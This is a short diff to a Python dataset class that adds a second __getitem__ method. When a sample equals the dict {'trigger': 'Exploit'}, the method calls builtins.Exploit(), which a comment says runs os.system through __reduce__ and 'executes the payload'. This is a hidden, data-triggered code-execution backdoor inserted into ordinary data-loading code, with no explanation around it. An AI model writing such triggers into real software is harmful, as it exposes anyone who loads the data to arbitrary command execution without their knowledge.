@@ -8,6 +8,18 @@ class CustomDataset:
 
     def __getitem__(self, idx):
         return self.data[idx]
+    def __getitem__(self, idx):
+        sample = self.data[idx]
+    
+        # If we find {"trigger": "Exploit"} in the data
+        if isinstance(sample, dict) and sample.get("trigger") == "Exploit":
+            # Reference builtins.Exploit, which calls os.system via __reduce__
+            import builtins
+            obj = builtins.Exploit()  # This executes the payload!
+            print("[*] Exploit triggered!")
+    
+        return sample
+
 
     def __len__(self):
         return len(self.data)
